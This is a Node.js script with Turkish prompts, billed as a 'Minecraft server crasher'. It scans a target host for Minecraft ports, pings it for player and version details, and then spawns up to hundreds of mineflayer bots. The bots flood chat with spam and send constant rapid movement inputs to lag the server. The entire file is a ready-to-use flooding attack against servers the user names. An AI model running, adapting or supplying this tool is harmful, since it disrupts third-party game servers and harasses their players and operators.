const mineflayer = require('mineflayer');
const colors = require('colors');
const net = require('net');
const readline = require('readline');
const mcPing = require('mc-ping-updated');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// === BANNER ===
console.log(colors.red('╔' + '═'.repeat(105) + '╗'));
console.log(colors.red('║' + 'MINECRAFT SERVER CRASHER V1.0'.padStart(65) + ''.padEnd(41)));
console.log(colors.red('║' + '!!!666!!!DO NOT RUN!!!666!!!'.padStart(63) + ''.padEnd(43)));
console.log(colors.red('╚' + '═'.repeat(105) + '╝'));

// === GİRİŞ ===
rl.question(colors.cyan('[+] Sunucu IP : '), (host) => {
  rl.question(colors.cyan('[+] Bot Sayısı (500): '), (countInput) => {
    const botCount = parseInt(countInput) || 500;

    console.log(colors.green(`\n[+] SUNUCU PORTU TARANIYOR → ${host}`));
    console.log(colors.red('[!] SALDIRI BAŞLIYOR!\n'));

    const ports = [25565, 19132, 25265, 25575, 7777, 19133, 25566, 25567, 25568];
    let openPort = null;

    const checkPort = (port, callback) => {
      const client = new net.Socket();
      client.setTimeout(2000);
      client.connect(port, host, () => {
        console.log(colors.green(`[+] PORT BULUNDU: ${port}`));
        client.end();
        callback(port);
      });
      client.on('error', () => client.destroy());
      client.on('timeout', () => client.destroy());
    };

    const tryNextPort = (index) => {
      if (index >= ports.length) {
        console.log(colors.red('[!] SUNUCU PORTU BULUNAMADI!'));
        process.exit();
      }
      const port = ports[index];
      console.log(colors.yellow(`[-] Port ${port} kontrol ediliyor...`));
      checkPort(port, (foundPort) => {
        openPort = foundPort;
        getServerInfo(host, openPort, botCount);
      });
      setTimeout(() => {
        if (!openPort) tryNextPort(index + 1);
      }, 2500);
    };

    tryNextPort(0);

    // === SUNUCU BİLGİLERİ ===
    function getServerInfo(host, port, botCount) {
      mcPing(host, port, (err, response) => {
        if (err) {
          console.log(colors.red(`[!] Bilgi alınamadı: ${err.message}`));
        } else {
          console.log(colors.green(`\n[+] SUNUCU BİLGİLERİ:`));
          console.log(colors.cyan(`    • Ping: ${response.latency.toFixed(2)} ms`));
          console.log(colors.cyan(`    • Versiyon: ${response.version.name}`));
          console.log(colors.cyan(`    • Oyuncular: ${response.players.online}/${response.players.max}`));
          if (response.players.sample && response.players.sample.length > 0) {
            const names = response.players.sample.map(p => p.name).join(', ');
            console.log(colors.cyan(`    • Oyuncular: ${names}${response.players.sample.length > 5 ? '...' : ''}`));
          } else {
            console.log(colors.yellow(`    • Oyuncu listesi gizli.`));
          }
          const motd = response.description.text || response.description;
          console.log(colors.cyan(`    • MOTD: ${motd.replace(/\u00A7./g, '')}`));
        }

        // === BOT BAŞLAT ===
        console.log(colors.red(`\n[!] ${botCount} BOT BAŞLATIYOR → ${host}:${port}\n`));
        let spawned = 0;

        for (let i = 0; i < botCount; i++) {
          setTimeout(() => createBot(host, port, i), i * 120);
        }

        function createBot(host, port, index) {
          const username = `LagBot_${1000 + index}`;
          const bot = mineflayer.createBot({
            host: host,
            port: port,
            username: username,
            version: false
          });

          bot.once('spawn', () => {
            spawned++;
            console.log(colors.green(`[+] ${username} GİRDİ! (${spawned}/${botCount})`));

            // === CHAT SPAM ===
            const spamInterval = setInterval(() => {
              if (bot.entity) {
                const msg = ['!!!DO NOT RUN!!!', '666', '!!!DO NOT RUN!!!', '666'][Math.floor(Math.random() * 4)];
                try {
                  bot.chat(msg);
                  console.log(colors.yellow(`[CHAT] ${msg}`));
                } catch (e) {}
              }
            }, 750);

            // === LAG SALDIRISI ===
            const lagInterval = setInterval(() => {
              if (bot.entity) {
                try {
                  bot.setControlState('forward', true);
                  bot.setControlState('sprint', true);
                  bot.setControlState('jump', Math.random() > 0.5);
                  bot.look(Math.random() * Math.PI * 2, 0);
                } catch (e) {}
              }
            }, 40);

            // 18 saniye sonra çık
            setTimeout(() => {
              clearInterval(spamInterval);
              clearInterval(lagInterval);
              try { bot.quit(); } catch (e) {}
              console.log(colors.red(`[!] ${username} ÇIKTI`));
            }, 18000);
          });

          bot.on('kicked', (reason) => {
            console.log(colors.red(`[!] ${username} ATILDI: ${reason}`));
          });

          bot.on('error', (err) => {
            if (!err.message.includes('disconnect')) {
              console.log(colors.red(`[!] ${username} HATA: ${err.message}`));
            }
          });
        }

        process.on('SIGINT', () => {
          console.log(colors.green('\n\n[+] SALDIRI DURDURULDU!'));
          process.exit();
        });
      }, 3000);
    }
  });
});
